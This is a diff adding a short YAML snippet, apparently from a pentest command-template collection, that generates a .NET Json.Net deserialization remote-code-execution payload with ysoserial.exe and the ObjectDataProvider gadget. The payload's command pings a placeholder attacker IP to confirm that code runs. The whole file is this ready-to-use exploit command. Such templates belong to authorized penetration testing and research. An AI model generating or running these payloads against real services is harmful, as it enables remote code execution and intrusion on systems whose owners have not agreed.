@@ -1,0 +1,11 @@
+---
+metadata:
+  filename: "generate-deserialization-rce-ysoserial-net-json.yaml"
+  tags: ["windows"]
+  created: "2025-07-09"
+  author: "@Anakles"
+
+content: |
+  <%=$(esh variables/delivery_path_windows)%>\Release\ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 <%=$(esh variables/attacker_ip)%>" -o <raw|base64>
+
+
